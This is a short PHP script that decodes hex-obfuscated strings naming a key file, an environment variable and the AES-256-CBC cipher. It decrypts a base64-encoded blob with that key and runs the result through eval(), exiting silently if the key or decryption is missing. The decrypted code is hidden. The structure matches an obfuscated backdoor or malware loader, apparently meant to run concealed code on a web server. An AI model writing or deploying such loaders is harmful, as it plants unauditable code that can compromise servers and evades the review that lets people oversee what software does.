<?php
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');
$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);
if(!$k)exit;
$i=base64_decode('rijLh/s0Kmf3M4e9OcoUyA==');
$c=base64_decode(
'owzWus8JOCTgVU3kj8v2H+9mtYzy6w3LC0QCSb+gLL9ro6oyjjLs4mnonabzb8bnLfgFLXdulIAi' .
'Ic/m5k7mnxDoxirszrew7mJTz/PXnJXF0Yxc9KU7NGle+iSP2rhTsYoqlxYNWRtRcNu4qSnS/7ae' .
'VlR8NfOosPRDKrwWJQYNgIiHzUS/suHNX0ZFkUMObe4HkK5PmnwmQ2X/Y4Ds4QAM0DokWM/AzEZg' .
'ke3B5RGHdrkfEAJHRNHzBLFmpl5PryGdm8OBMIBwZOBaDCrI9P3kWLWalOexIaDK/u4hUeMneLmA' .
'z307NAXJxCD1UC14IXBzBVhAx5mHF2s3DtMTN2Pda1YcLIEfHYYxirvFDRBlNDGveskT2Dhwu6ow' .
'IRG8m6CGYybqJAR+xJHE60xbRkGIwqNtV23lmtPHKEmmFXy+/efdkWu/XDCFulFFEmgHzZcI7Hte' .
'HxQyDV9OZSe41DPutiok/0mMJBPCGMImA7ZRGQ17AB015SXqanozYygExmAxRGN5izhSjpubyrjM' .
'vflHhv594AtGy5HNmoU3etM='
);
$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);
if($d===false)exit;
eval($d);
